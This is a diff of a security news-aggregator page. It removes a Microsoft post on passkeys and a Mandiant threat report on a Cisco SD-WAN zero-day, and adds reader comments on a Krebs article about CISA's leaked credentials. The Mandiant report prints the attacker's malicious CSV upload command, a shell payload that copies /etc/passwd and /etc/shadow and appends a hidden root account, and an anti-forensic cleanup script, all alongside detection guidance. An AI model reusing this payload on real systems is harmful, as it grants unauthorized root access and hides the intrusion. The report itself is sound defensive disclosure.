-            <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/07/13/microsoft-entra-id-security-updates-passkeys-are-the-default-authentication-method-in-entra-id/" target="_blank">Original Link</a></p>
-            <div class="content-text">As identity attacks grow more sophisticated in the AI era, organizations need stronger authentication methods that protect users from phishing, credential theft, and social engineering. To address these evolving threats, [Microsoft Entra ID](https://www.microsoft.com/en-us/security/business/identity-access/microsoft-entra-id) is updating its authentication experience by making passkeys the default phishing-resistant authentication method, helping customers reduce reliance on phishable methods such as SMS and voice.
-Beginning September 1, 2026, Microsoft will begin rolling out passkeys as the default authentication experience in Microsoft Entra ID. As the rollout reaches each organization, users enabled for SMS or voice authentication will automatically be enabled for passkeys, and the next time they perform multifactor authentication, they’ll be prompted to register a passkey.
-Following this transition, on February 1, 2027, Microsoft will retire Microsoft-provided telecom delivery for SMS and voice authentication and will no longer offer SMS and voice as a native [Microsoft Entra](https://www.microsoft.com/en-us/security/business/microsoft-entra) capability. Organizations that still require SMS or voice authentication methods will have the option to choose one of our telecom partners through the Microsoft Security Store. Customers will be responsible for any associated telecom-related costs charged by the telecom partners.
-We strongly recommend moving users to passkeys or another phishing-resistant authentication method as soon as possible.
-Why stronger authentication matters in the AI era
-Authentication methods that use SMS or voice rely on shared secrets or channels that attackers increasingly intercept, phish, or manipulate. [Passkeys](https://www.microsoft.com/en-us/security/business/security-101/what-is-passkey) use public-key cryptography rather than shared secrets, making them phishing-resistant by design. They also provide a faster, simpler sign-in experience for users.
-The case for moving beyond SMS and voice is no longer just that attackers intercept or socially engineer these methods. The threat environment has changed in speed, scale, and sophistication. Microsoft Threat Intelligence has observed AI-enabled phishing campaigns reaching click-through rates as high as 54%, compared with roughly 12% for more traditional campaigns, making stolen passwords and phishable second factors an urgent risk.1 At the same time, tactics such as SIM swapping and multifactor authentication bypass have become more accessible and repeatable.
-An AI-powered cyberattack can use a compromised identity to automate discovery, privilege escalation, and lateral movement much faster than a human attacker working manually. This is why phishing-resistant authentication methods are so important.
-By making passkeys the default authentication experience, organizations reduce reliance on phishable authentication methods and strengthen protection against credential theft and phishing.
-Still need SMS or voice? Select a telecom provider in Microsoft Security Store
-Today, Microsoft provides the telecom delivery behind SMS and voice authentication natively within Entra ID. As part of this transition, we’ll step back from providing that native telecom delivery to encourage phishing-resistant methods as the standard for everyone.
-For most organizations, the recommended path is simple: move users to passkeys at no additional cost.
-If you have a regulatory, technical, or business requirement to keep SMS or voice, you’ll be able to select, configure, and manage a third-party telecom provider through the Microsoft Security Store—a partner marketplace where you can contract directly with supported carriers.
-On September 18, 2026, we’ll share information on supported providers, deployment guidance, and technical documentation with pricing and commercial terms available through the Microsoft Security Store.
-How to prepare
-Start planning your transition now so you can select the deployment approach that best fits your organization and ensure your users are prepared for upcoming changes to their sign-in experience.
-- Identify users who still use SMS or voice. Review your authentication method policy and identify which users or groups are enabled for SMS or voice authentication.
-- Plan your passkey rollout. Enable
-[passkeys](https://learn.microsoft.com/en-us/entra/identity/authentication/concept-authentication-passkeys-fido2)and select the types that best fit your users’ devices and workflows. Microsoft Entra ID supports:- Synced passkeys, such as passkeys stored in platform credential managers like iCloud Keychain and Google Password Manager.
-- Device-bound passkeys, such as Microsoft Authenticator passkeys, Entra passkey on Windows, and FIDO2 security keys.
-- Use a
-[registration campaign](https://learn.microsoft.com/en-us/entra/identity/authentication/how-to-mfa-registration-campaign)to drive adoption. Microsoft Entra ID can help organizations move users at scale by prompting them to register a passkey during multifactor authentication sign-in. - Prepare user communications. Tell affected users what’s changing, when they’ll see a passkey registration prompt, and how to complete registration on their device.
-For step-by-step guidance on planning, deploying, and managing passkeys, see our Microsoft Learn documentation and passkey deployment guide.
-[aka.ms/passkeybydefault](http://aka.ms/passkeybydefault)[Get started with a phishing-resistant passwordless authentication deployment in Microsoft Entra ID](https://learn.microsoft.com/en-us/entra/identity/authentication/how-to-plan-prerequisites-phishing-resistant-passwordless-authentication)
-If regulated, technical, or operational scenarios still require SMS or voice:
-- Identify and document affected user segments.
-- Starting October 30, 2026, select and configure a supported telecom provider through the Microsoft Security Store.
-- Test your configuration with a pilot group before any broad rollout.
-Timeline
-| Date | Milestone |
-|---|---|
-| September 1, 2026 | All users enabled for SMS or voice are auto-enabled and nudged for passkey registration upon multifactor authentication sign-in. Use the passkey deployment guide to prepare your environment for passkey use. Notify affected users about the upcoming change. Ensure every user has a phishing-resistant authentication method, such as a passkey, Entra passkeys on Windows, or a FIDO2 security key. |
-| September 18, 2026 | Pricing, commercial terms, and a list of supported telecom providers will be shared. If you plan to continue using SMS or voice authentication, review the available provider options and identify affected users. |
-| October 30, 2026 | Admins may select and configure a supported telecom provider through the Microsoft Security Store. |
-| February 1, 2027 | Microsoft-provided SMS and voice authentication ends. If SMS or voice remains necessary for specific users, configure a supported telecom provider before this date. |
-| After February 1, 2027 | Users who use SMS or voice for multifactor authentication will be required to register a passkey before they can sign in. Automatic prompts to register a passkey will be enforced for all users in all tenants. There will be no opt-out option. |
-Note: The dates outlined in this post apply to Microsoft Entra ID in the public cloud only. Support for other cloud environments will follow on a separate timeline, with additional guidance and dates to be announced in advance.
-SMS and voice have served their purpose well, bringing multifactor authentication to billions of users who otherwise would have had none. But the threat environment has evolved beyond their capabilities, and we need to evolve with it.
-We’re making passkeys the default in Entra ID because they work better for users and worse for cyberattackers. We’re trying to make this transition as predictable as possible with clear dates, fallback options during migration, and [recovery](https://learn.microsoft.com/en-us/entra/identity/authentication/concept-account-recovery-overview) that doesn’t depend on phishable credentials anymore.
-Learn more at [aka.ms/passkeybydefault](https://aka.ms/passkeybydefault)
-To learn more about Microsoft Security solutions, visit our [website.](https://www.microsoft.com/en-us/security/business) Bookmark the [Security blog](https://www.microsoft.com/security/blog/) to keep up with our expert coverage on security matters. Also, follow us on LinkedIn ([Microsoft Security](https://www.linkedin.com/showcase/microsoft-security/)) and X ([@MSFTSecurity](https://twitter.com/@MSFTSecurity)) for the latest news and updates on cybersecurity.</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-7" class="article-body">
+        <div id="art-9" class="article-body">
             <h2 class="article-title">Lessons Learned from CISA’s Recent GitHub Leak</h2>
             <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/07/lessons-learned-from-cisas-recent-github-leak/" target="_blank">Original Link</a></p>
             <div class="content-text">The Cybersecurity and Infrastructure Security Agency (CISA) has issued a postmortem on a recent data leak in which a contractor published dozens of internal CISA credentials — including AWS Govcloud keys — in a public GitHub repository for almost six months before being notified by KrebsOnSecurity. Experts say the gaps identified in the agency’s initial response provide important lessons that all security teams should absorb.
@@ -566,6 +844,7 @@ CISA gave itself passing grades on several areas of security preparedness that i
 Valadon reckons the biggest takeaway is the CISA postmortem itself, and praised the agency for being transparent about what worked and what didn’t.
 “To my knowledge, it is also the first time a national cybersecurity agency has publicly advocated for secrets scanning and for simplifying relations with security researchers,” Valadon wrote. “That is exactly the incident communication we should expect from every organization.”
 The government will always condone and positively critique its own behavior. Some bureaucrat(s) should at least lose their job and pensions as a result of this egregious fubar.
+Unfortunately, so many people have been culled at CISA and other agencies by the orange-faced buffoon there aren’t enough people left to do the job properly. Firing those who are already overworked and underpaid isn’t the answer. Yes, this incident was preventable and should have been caught sooner, but when your bosses boss changes priorities to make sure that national security takes a back seat to them making money these things happen.
 I’m surprised we didn’t print out that importantAWStokens text file and kept it in a cardboard box in a Mar A Lago bathroom. What else can you expect from the current government?
 I dunno about you, but I kind of don’t think it is a terrible idea to keep some printouts of keys offline in a safe place somewhere. Too many disk meltdowns and outages to not know how that can go.
 Thanks, Brian. There’s a reason I still read you daily, even though I retired from my sysadmin job in ’19.
@@ -573,227 +852,9 @@ The root cause is the overuse of contractors. A long time ago, contractors were 
 Do DOGE cuts have any impact on this event? Would this happen have happened in earlier times?
 I agree with you, john. I think the recent DOGE cuts DID have something to do with it. I read morale was low and the people working there have had their workloads increased.
 wow
-If anybody out there in United States still think that any government agency in this country can keep any secrets about anything anymore. Let me dissuade you of that idea. Anything you share with the government will always be hacked and shared with the rest of the world. There are no secrets. If anybody thinks the Russians, the Chinese the North Koreans don’t know everything that goes on in this country with all our companies and the government is living in delusion land.</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-8" class="article-body">
-            <h2 class="article-title">Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager</h2>
-            <p class="source-link">Source: Threat Intelligence | <a href="https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager/" target="_blank">Original Link</a></p>
-            <div class="content-text">Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager
-Mandiant
-Written by: Chester Sng, Pete Boonyakarn, Logeswaran Nadarajan, Lukasz Lamparski
-Introduction
-In early 2026, Mandiant identified a threat actor targeting SD-WAN infrastructure at a service provider. After gaining initial access, the threat actor exploited a zero-day vulnerability ([CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)) in Cisco Catalyst SD-WAN to escalate privileges from a compromised administrative account to root-level access.
-The vulnerability stems from the device’s file upload feature lacking the ability to properly filter malicious data.
-Throughout the intrusion, to maintain operational security and avoid detection, the threat actor consistently employed anti-forensic techniques, selectively deleting and restoring system configuration files that were modified during their activities.
-Key Observations
--
-Rogue Peering and Credential Manipulation: In March 2026, a threat actor established initial access via unauthorized peering connections to facilitate Secure Shell (SSH) access. The threat actor used that access to manipulate default account passwords to evade detection.
--
-Exploitation of CVE-2026-20245: Subsequently, the attacker leveraged a zero-day privilege escalation vulnerability (now tracked as CVE-2026-20245) in Cisco Catalyst SD-WAN Manager to gain root-level access via a malicious CSV upload.
--
-Extensive Anti-Forensic Cleanup: The threat actor deleted malicious files, reverted configuration changes, and executed a validation script to ensure indicators are purged.
-What is SD-WAN?
-Traditional Wide Area Networks (WANs) rely heavily on physical, proprietary hardware routers to direct traffic. This model is often rigid, complex to scale, and struggles to handle the demands of modern cloud computing.
-Software-Defined Wide Area Network (SD-WAN) solves this by decoupling the network’s management and control logic from the underlying physical hardware. Instead of configuring individual routers one by one, a centralized software controller is used to orchestrate the entire network from a single dashboard. SD-WANs are typically used by highly distributed organizations, such as banks, retail corporations, technology services, and healthcare providers, to securely connect multiple remote branch locations directly to central cloud services.
-What is Peering?
-Within an SD-WAN fabric, peering is the logical process of establishing a trusted, authenticated relationship between distinct network components, such as edge routers, regional hubs, and central controllers.
-Before any data can be securely transmitted across the network fabric, these devices must perform a digital handshake. During the peering phase, devices mutually authenticate each other using cryptographic certificates. Once identity and trust are verified, they exchange underlying routing tables and automatically build secure tunnels to facilitate safe data transport.
-Additional Vulnerabilities in Cisco Catalyst SD-WAN Controllers
-[CVE-2026-20127](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-rpa-EHchtZk) and [CVE-2026-20182](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-rpa2-v69WY2SW) are critical vulnerabilities recently disclosed by Cisco that affect the peering authentication mechanism for Cisco Catalyst SD-WAN controllers. Both vulnerabilities could allow an unauthenticated, remote attacker to bypass authentication and obtain administrative privileges.
-Intrusion Campaign Overview
-Initial Access Via Rogue Peering Connections
-From late 2025 to January 2026, Mandiant observed multiple unauthorized peering connections to the victim’s SD-WAN Manager devices. It is possible that these connections occurred due to the exploitation of CVE-2026-20127 or CVE-2026-20182 as the vulnerabilities were not disclosed, and patches were not available during this period.
-Beginning in March 2026, further unauthorized peering connections were seen on a device running a software version unaffected by CVE-2026-20127. However, Cisco confirmed that these connections did not leverage CVE-2026-20182 either, and could instead be using stolen certificate material from a previous compromise of the same device.
-It is unclear if the same threat actor was responsible for the late 2025 to January 2026 and March 2026 rogue peering activity.
-Successful Authentications By Altering The Admin Account Password
-In March 2026, the threat actor established new rogue peer connections and successfully authenticated to the SD-WAN Manager device via SSH using the vmanage-admin
-account on the same victim devices.
-Once authenticated via SSH, the threat actor executed commands to change the password of the default admin
-account. The threat actor authenticated directly to the SD-WAN Manager web application interface using the admin
-account and exfiltrated configurations of the SD-WAN fabric.
-[2026-03-07T01:31:48.464Z]"POST /j_security_check HTTP/1.1" 200 - 31 0 1288 - "<Threat Actor Control Plane IP>" "Mozilla/5.0" "<Log ID>" "<SD-WAN Manager IP>:8443" "127.0.0.1:8080"
-[2026-03-07T01:31:49.017Z] "GET /dataservice/system/device/vedges HTTP/1.1" 200 - 0 10114 127 - "<Threat Actor Control Plane IP>" "Mozilla/5.0" "<Log ID>" "<SD-WAN Manager IP>:8443" "127.0.0.1:8080"
-[2026-03-07T01:31:50.017Z] "GET /dataservice/system/device/controllers HTTP/1.1" 200 - 0 15815 100 - "<Threat Actor Control Plane IP>" "Mozilla/5.0" "<Log ID>" "<SD-WAN Manager IP>:8443" "127.0.0.1:8080"
-[2026-03-07T01:31:51.925Z] "GET /dataservice/template/config/attached/<Device ID> HTTP/1.1" 200 - 0 3732 18 - "<Threat Actor Control Plane IP>" "Mozilla/5.0" "<Log ID>" "<SD-WAN Manager IP>:8443" "127.0.0.1:8080"
-[2026-03-07T01:31:52.493Z] "GET /dataservice/template/config/running/<Device ID> HTTP/1.1" 400 - 0 134 19 - "<Threat Actor Control Plane IP>" "Mozilla/5.0" "<Log ID>" "<SD-WAN Manager IP>:8443" "127.0.0.1:8080"
-<...>
-Figure 1: Threat actor authentication and configuration extraction
-The threat actor subsequently used their active vmanage-admin
-session to change the password of the admin
-account back to its original state before terminating their active session. This activity was likely performed to reduce the probability of detection by an administrator trying to log into the device during day-to-day operations.
-The vmanage-admin
-and admin
-accounts are default accounts on Cisco Catalyst SD-WAN controllers that have different privileges, but [neither possesses root shell access](https://www.cisco.com/c/en/us/td/docs/routers/sdwan/17-x/systems-interfaces/systems-interfaces-guide-17-x/users-and-access.html).
-Exploitation of CVE-2026-20245 to Escalate Privileges
-Mandiant observed that in April 2026, after establishing an SSH session with the admin
-account, the threat actor exploited CVE-2026-20245 by executing the following command to upload a file named evil_tenant.csv
-:
-request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
-Figure 2: Malicious file upload
-[CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx), a vulnerability reported to Cisco by Mandiant, exists in the command-line interface (CLI) of Cisco Catalyst SD-WAN Controllers that could allow an authenticated, local attacker to execute arbitrary commands as root by supplying a crafted file to the affected system.
-The evil_tenant.csv
-file contains the exploit payload. The following code block (Figure 3) shows a snippet of the exploit which attempts to append malicious entries to the system's /etc/passwd
-and /etc/shadow
-files.
-if [ -e /usr/share/viptela/vbond_vsmart_tenant_list ] && grep -q '<redacted>' /usr/share/viptela/vbond_vsmart_tenant_list 2>/dev/null; then
-echo absent > /home/admin/.orig_vbond_vsmart_tenant_list.state;
-elif [ -e /usr/share/viptela/vbond_vsmart_tenant_list ]; then
-echo present > /home/admin/.orig_vbond_vsmart_tenant_list.state;
-cp -a /usr/share/viptela/vbond_vsmart_tenant_list /home/admin/.orig_vbond_vsmart_tenant_list;
-else
-echo absent > /home/admin/.orig_vbond_vsmart_tenant_list.state;
-fi;
-cp -a /etc/passwd /home/admin/.orig_passwd;
-cp -a /etc/shadow /home/admin/.orig_shadow;
-grep -q '^troot:' /etc/passwd || echo 'troot:x:0:0:root:/root:/bin/bash' >> /etc/passwd;
-grep -q '^troot:' /etc/shadow || echo 'troot:<redacted>:19000:0:99999:7:::' >> /etc/shadow
-Figure 3: Appending malicious entries
-Through this command, the threat actor achieved the following:
--
-Backed up the original
-vbond_vsmart_tenant_list
-configuration file, which would have been overwritten by the contents ofevil_tenant.csv
-during the exploit. This backup was likely created to allow the actor to restore the file later, ensuring the SD-WAN Manager device did not load an invalid configuration that might alert administrators. -
-Created backups of the original
-/etc/passwd
-and/etc/shadow
-files. -
-Created a user account named
-troot
-with full root privileges.
-Mandiant subsequently observed the threat actor accessing this new troot
-account from the admin
-account via the su
-(substitute user) command.
-Anti-Forensic Techniques
-Mandiant identified that the threat actor deleted all files they created, including evil_tenant.csv
-, and restored any system configurations they modified. These deletion and modifications were done to minimize their forensic footprint.
-In addition to this, Mandiant also observed execution of a validation script, which checks if indicators of the threat actor's activities are removed.
-for f in /home/admin/evil_tenant.csv /home/admin/.orig_vbond_vsmart_tenant_list /home/admin/.orig_vbond_vsmart_tenant_list.state /home/admin/.orig_passwd /home/admin/.orig_shadow;
-do if [ -e "$f" ];
-then echo PRESENT:$f; ls -ld "$f";
-else echo ABSENT:$f;
-fi;
-done;
-if grep -q '^troot:' /etc/passwd;
-then echo PRESENT:/etc/passwd:troot;
-else echo ABSENT:/etc/passwd:troot;
-fi;
-if [ -e /usr/share/viptela/vbond_vsmart_tenant_list ];
-then echo PRESENT:/usr/share/viptela/vbond_vsmart_tenant_list; ls -ld /usr/share/viptela/vbond_vsmart_tenant_list;
-else echo ABSENT:/usr/share/viptela/vbond_vsmart_tenant_list;
-fi
-Figure 4: Validation script
-This script checks for the presence of the following:
--
-Threat actor-created files in
-/home/admin.
--
-troot
-account in thepasswd
-andshadow
-files. -
-vbond_vsmart_tenant_list
-, and if it exists, inspect information about the file. This is likely to check if the original file was restored.
-Outlook and Implications
-This campaign underscores the living off the edge paradigm, where threat actors prioritize the compromise of network appliances to bypass traditional security perimeters. As organizations increasingly adopt software-defined networking, the orchestrators managing these environments become primary targets. These devices offer a black box environment for threat actors: they often lack the telemetry required for deep forensic analysis, and their role as a central control plane provides a stealthy platform for persistent, wide-scale access to internal enterprise traffic. For state-sponsored actors, the ability to exploit zero-day vulnerabilities in these platforms remains a premier vector for long-term strategic intelligence collection. Google Threat Intelligence Group (GTIG) has [closely](https://cloud.google.com/blog/topics/threat-intelligence/zero-days-exploited-2022) [tracked](https://cloud.google.com/blog/topics/threat-intelligence/2023-zero-day-trends) [and](https://cloud.google.com/blog/topics/threat-intelligence/2024-zero-day-trends) [reported](https://cloud.google.com/blog/topics/threat-intelligence/2025-zero-day-review) on increased zero-day exploitation of edge devices over the past several years.
-Remediation and Hardening
--
-Perform IOC Sweep / Threat Hunting: Collect logs and diagnostic data from SD-WAN devices by executing
-request admin-tech
-command on all control-plane components. Scan these collections for known IOCs and execute threat hunts focused on the TTPs identified in the Detections and Hunting section of this blog post. If true positive hits are observed, perform a full investigation. -
-Manual Remediation Support: As per Cisco’s guidance, any confirmed indicators of compromise or suspicious activity should be forwarded to
-[Cisco Technical Assistance Center (TAC)](https://www.cisco.com/c/en/us/support/web/tsd-cisco-worldwide-contacts.html)for comprehensive review and remediation assistance. -
-Prioritize Immediate Patching and Upgrades: Organizations must prioritize upgrading Cisco Catalyst SD-WAN Manager to fixed software releases, specifically versions 20.9.9.2, 20.12.7.2, 20.15.4.5, 20.15.5.3, 20.18.3.1, 26.1.1.2, or later, to remediate
-[CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx). -
-Implement Cisco Catalyst SD-WAN Hardening and Logging Guidelines: Organizations should follow the comprehensive security best practices and configuration standards detailed in the
-[Cisco Catalyst SD-WAN Hardening Guide](https://sec.cloudapps.cisco.com/security/center/resources/Cisco-Catalyst-SD-WAN-HardeningGuide). This guide provides a robust defense-in-depth framework for securing all SD-WAN components including the management, control, and data planes against unauthorized access.
-Indicators of Compromise (IOCs)
-To assist the wider community in hunting and identifying activity outlined in this blog post, we have included indicators of compromise (IOCs) in a free [GTI Collection](https://www.virustotal.com/gui/collection/d966161b93100fb8905b9b81bd03e57bbc93f21534acee88999e77798e913d5b/summary) for registered users.
-Network Indicators
-File Indicators
-Due to the threat actor's extensive anti-forensic cleanup, several files associated with this intrusion were overwritten or deleted. However, forensic remnants of the malicious CSV payload were recovered.
-Detections and Hunting
-Mandiant encourages organizations to conduct proactive threat hunts focused on the tactics, techniques, and procedures (TTPs) outlined in this report to identify activity that may otherwise blend into routine operations. Because certain indicators of compromises may mirror legitimate administrative actions, it is critical to assess these observations against the established network posture to minimize false positives.
-As per Cisco’s guidance, any suspicious activity or confirmed IOCs should be forwarded to the Cisco TAC for comprehensive review and assistance.
-Unauthorized SSH Connections as vmanage-admin
-Monitor authentication logs (/var/log/auth.log
-) for logins originating from unexpected external IP addresses using the vmanage-admin user account.
-Jan 01 07:58:00 vManage sshd[20766]: Accepted publickey for vmanage-admin from <Threat Actor IP> port 48373 ssh2: RSA SHA256:<redacted>
-Jan 01 08:01:00 vManage sshd[25178]: Accepted keyboard-interactive/pam for admin from <Threat Actor IP> port 60552 ssh2
-Figure 5: SSH from unexpected origins
-Suspicious Password Change Events
-Audit password changes in /var/log/auth.log
-targeting the admin account in quick succession, particularly where credentials are set and subsequently reverted.
-Jan 01 08:00:00 vManage usermod[12345]: change user 'admin' password
-Jan 01 08:15:00 vManage usermod[12345]: change user 'admin' password
-Figure 6: Password changes
-Defenders should also inspect rollback files present within /var/confd/rollback/
-for configuration delta commits targeting user passwords:
-# Created by: vmanage-admin
-# Date: 2026-01-01 08:00:00
-# Via: netconf
-# Type: delta
-# Label:
-# Comment:
-# No: 10000
-# TransactionId: 12345678
-# Hostname: vManage
-system {
-aaa {
-user admin {
-password <redacted>;
-}
-}
-}
-Figure 7: Rollback files
-Suspicious Execution of the su
-Command
-Audit terminal command history and system logs (/var/log/auth.log
-) for successful switch user (su
-) executions from the admin account to unauthorized accounts (e.g., troot
-).
-Jan 01 08:03:00 vManage su[24289]: Successful su for troot by admin
-Figure 8: su
-logins
-Exploitation of CVE-2026-20245
-Monitor script logs (/var/log/scripts.log
-) for execution anomalies involving unauthorized execution of vconfd_script_upload_tenant_list.sh
-.
-Jan 01 08:01:05 vManage vScript: Tenant list upload per vsmart serial number: /usr/bin/vconfd_script_upload_tenant_list.sh -cli path /home/admin/evil_tenant.csv vpn 0
-Jan 01 08:01:05 vManage vScript: uploading tenant list via VPN 0 true
-Jan 01 08:01:05 vManage vScript: Copying ... /home/admin/evil_tenant.csv via VPN 0
-Jan 01 08:01:05 vManage vScript: Successfully loaded the tenant placement file
-Figure 9: Execution anomalies
-Defenders can also query active command execution history using show history within the Viptela CLI for the specific administrative upload commands:
-01-01 08:01:05 -- request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
-Figure 10: Command execution
-Google Security Operations (SecOps)
-Google SecOps customers have access to these broad category rules and more under the Mandiant Intel Emerging Threats rule pack. The activity discussed in the blog post is detected in Google SecOps under the rule names:
--
-Privileged Account Append to Passwd Database
--
-Grep Privileged User Account Discovery in Passwd or Shadow
--
-Hidden Backup of Sensitive System Files
--
-Suspicious Copy from Usr Share to User Hidden Directory
-Acknowledgements
-Mandiant would like to thank the Cisco Product Security Incident Response Team (PSIRT) for their collaboration and partnership throughout the coordinated disclosure process.</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-9" class="article-body">
-            <h2 class="article-title">Updates to the MSSQLHound OpenGraph Collector for BloodHound</h2>
-            <p class="source-link">Source: Research & Tradecraft Archives - SpecterOps | <a href="https://specterops.io/blog/2026/01/20/updates-to-the-mssqlhound-opengraph-collector-for-bloodhound/" target="_blank">Original Link</a></p>
-            <div class="content-text"><p>tl;dr: MSSQLHound, a PowerShell script that collects security information from remote MSSQL Server instances, now scans them to determine whether or not NTLM relay attacks are possible, accounts for a recent privilege escalation vulnerability, and includes queries you can import into the BloodHound attack path graph to visualize, navigate, and remediate misconfigurations in MSSQL. Updates [&#8230;]</p>
-<p>The post <a href="https://specterops.io/blog/2026/01/20/updates-to-the-mssqlhound-opengraph-collector-for-bloodhound/">Updates to the MSSQLHound OpenGraph Collector for BloodHound</a> appeared first on <a href="https://specterops.io">SpecterOps</a>.</p>
-
-[Full content could not be extracted. Visit source for details.]</div>
+If anybody out there in United States still think that any government agency in this country can keep any secrets about anything anymore. Let me dissuade you of that idea. Anything you share with the government will always be hacked and shared with the rest of the world. There are no secrets. If anybody thinks the Russians, the Chinese the North Koreans don’t know everything that goes on in this country with all our companies and the government is living in delusion land.
+“Another file — ‘AWS-Workspace-Firefox-Passwords.csv’ — listed plaintext usernames and passwords for dozens of internal CISA systems.”
+The bar is in hell and we’re still faceplanting</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
